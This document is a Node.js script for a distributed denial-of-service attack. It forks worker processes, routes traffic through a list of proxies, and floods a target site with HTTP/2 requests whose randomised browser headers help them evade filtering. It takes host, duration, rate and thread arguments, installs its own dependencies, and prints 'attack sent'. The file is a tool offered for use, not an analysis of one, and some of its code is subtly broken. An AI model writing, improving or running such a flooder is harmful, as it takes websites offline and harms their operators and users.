const requiredModules = ["net", "http2", "tls", "cluster", "cloudscraper", "url", "crypto", "user-agents", "fs"];
requiredModules.forEach((url) => {
  try {
    require.resolve(url);
  } catch (_0x3aed62) {
    console.log("Installing the module " + url + "...");
    const {
      execSync : execSync
    } = require("child_process");
    execSync("npm install " + url);
  }
});
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const cloudscraper = require("cloudscraper");
const url = require("url");
const crypto = require("crypto");
const UserAgent = require("user-agents");
const fs = require("fs");
process.on("uncaughtException", function(canCreateDiscussions) {
});
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
function readLines(file) {
  return fs.readFileSync(file, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(i, n) {
  return Math.floor(Math.random() * (n - i) + i);
}
function randomElement(array) {
  return array[randomIntn(0, array.length)];
}
if (process.argv.length !== 7) {
  console.log(`\x1b[1;37mUsage\x1b[1;31m: \x1b[1;37mnode browser\x1b[1;31m [\x1b[1;37mhost\x1b[1;31m] [\x1b[1;37mtime\x1b[1;31m] [\x1b[1;37mrate\x1b[1;31m] [\x1b[1;37mthread\x1b[1;31m] [\x1b[1;37mproxy.txt\x1b[1;31m]\x1b[1;37m`);
  process.exit(1);
}
const args = {
  target : process.argv[2],
  time : ~~process.argv[3],
  Rate : ~~process.argv[4],
  threads : ~~process.argv[5],
  proxyFile : process.argv[6]
};
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let i = 1; i <= args.threads; i++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}
class NetSocket {
  constructor() {
  }
  ["HTTP"](u, callback) {
    const _0x338594 = u.address.split(":");
    const _0x541a11 = _0x338594[0];
    const data = "CONNECT " + u.address + ":443 HTTP/1.1\r\nHost: " + u.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const emlbuffer = new Buffer.from(data);
    const connection = net.connect({
      host : u.host,
      port : u.port
    });
    const ajaxInterval = randomIntn(0, 50000);
    setTimeout(() => {
      connection.write(emlbuffer);
    }, ajaxInterval);
    connection.setTimeout(u.timeout * 10000);
    connection.setKeepAlive(true, 100000);
    connection.on("connect", () => {
    });
    connection.on("data", (bin) => {
      const inventoryKeys = bin.toString("utf-8");
      const _0x3f4ee3 = inventoryKeys.includes("HTTP/1.1 200");
      if (_0x3f4ee3 === false) {
        return connection.destroy(), callback(undefined, "error: invalid response from proxy server");
      }
      return callback(connection, undefined);
    });
    connection.on("timeout", () => {
      return connection.destroy(), callback(undefined, "error: timeout exceeded");
    });
    connection.on("error", (status) => {
      return connection.destroy(), callback(undefined, "error: " + status);
    });
  }
}
const Socker = new NetSocket;
function randomIntn(i, n) {
  return Math.floor(Math.random() * (n - i) + i);
}
function getRandomUserAgent() {
  const map = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0\u00a0Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9", "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240", "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Linux; Android 12; V2120 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36"];
  const num_elements = randomIntn(15, map.length);
  return map[num_elements];
}
const accept_header = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel"    
],
cache_header = [
    'max-age=0',
    'no-cache',
    'no-store', 
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
],
Generate_Encoding = [
    '*',
    'gzip, deflate',
    'br;q=1.0, gzip;q=0.8, *;q=0.1',
    'gzip',
    'gzip, compress',
    'compress, deflate',
    'compress',
    'gzip, deflate, br',
    'deflate',
],
language_header = [
    'en-GB,en;q=0.7',
    'en-GB-oxendict,en;q=0.9,pl-PL;q=0.8,pl;q=0.7',
],
dest_header = [
    'audio',
    'audioworklet',
    'document',
    'embed',
    'empty',
    'font',
    'frame',
    'iframe',
    'image',
    'manifest',
    'object',
    'paintworklet',
    'report',
    'script',
    'serviceworker',
    'sharedworker',
    'style',
    'track',
    'video',
    'worker',
    'xslt'
],
mode_header = [
    'cors',
    'navigate',
    'no-cors',
    'same-origin',
    'websocket'
],
site_header = [
    'cross-site',
    'same-origin',
    'same-site',
    'none'
],
sec_ch_ua = [
    '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"'
];
const headers = {
        ":authority": parsedTarget.host,
        ":method": "GET",
        ":path": parsedTarget.path,
        ":scheme": parsedTarget.protocol == "https:" ? "https" : "http",
        "Accept": accept_header[Math.floor(Math.random() * accept_header.length)],
        "accept-encoding": Generate_Encoding[Math.floor(Math.random() * Generate_Encoding.length)],
        "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
        "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
        "origin": parsedTarget.protocol + "//" + parsedTarget.host,
        "referer": parsedTarget.href,
        "sec-ch-ua": sec_ch_ua[Math.floor(Math.random() * sec_ch_ua.length)],
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": dest_header[Math.floor(Math.random() * dest_header.length)],
        "sec-fetch-mode": mode_header[Math.floor(Math.random() * mode_header.length)],
        "sec-fetch-site": site_header[Math.floor(Math.random() * site_header.length)],
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": 1,
        "user-agent": map[Math.floor(Math.random() * map.length)],
};
console.log("attack sent");
function runFlooder() {
  const componentsStr = randomElement(proxies);
  const entityMatches = componentsStr.split(":");
  const _0xd7a249 = new UserAgent;
  var _0x35986b = "poziomka/3.14.15";
  const options = {
    host : entityMatches[0],
    port : ~~entityMatches[1],
    address : parsedTarget.host + ":443",
    timeout : 15
  };
  Socker.HTTP(options, (socket, canCreateDiscussions) => {
    if (canCreateDiscussions) {
      return;
    }
    socket.setKeepAlive(true, 600000);
    const sslOptions = {
      ALPNProtocols : ["h2"],
      rejectUnauthorized : false,
      servername : url.hostname,
      socket : socket,
      secure : true,
      servername : parsedTarget.host,
      cipherSuites : ["TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256"],
      fingerprint : "SHA-256:RqiHyxRAQSbDM..."
    };
    const connection = tls.connect(443, parsedTarget.host, sslOptions);
    connection.setKeepAlive(true, 600000);
    const client = http2.connect(parsedTarget.href, {
      protocol : "https:",
      settings : {
        headerTableSize : 65536,
        maxConcurrentStreams : 1000,
        initialWindowSize : 6291456,
        maxHeaderListSize : 262144,
        enablePush : false
      },
      maxSessionMemory : 3333,
      maxDeflateDynamicTableSize : 4294967295,
      createConnection : () => {
        return connection;
      },
      socket : socket
    });
    client.settings({
      headerTableSize : 65536,
      maxConcurrentStreams : 1000,
      initialWindowSize : 6291456,
      maxHeaderListSize : 262144,
      enablePush : false
    });
    client.on("connect", () => {
      const _0x124110 = setInterval(() => {
        for (let i = 0; i < args.Rate; i++) {
          const tooltip_info = client.request(headers).on("response", (canCreateDiscussions) => {
            tooltip_info.close();
            tooltip_info.destroy();
            return;
          });
          setTimeout(() => {
            tooltip_info.end();
          }, 0);
        }
      }, 500);
    });
    client.on("close", () => {
      client.destroy();
      socket.destroy();
      return;
    });
    client.on("error", (canCreateDiscussions) => {
      client.destroy();
      socket.destroy();
      return;
    });
  });
}
const KillScript = () => {
  return process.exit(1);
};
setTimeout(KillScript, args.time * 1000);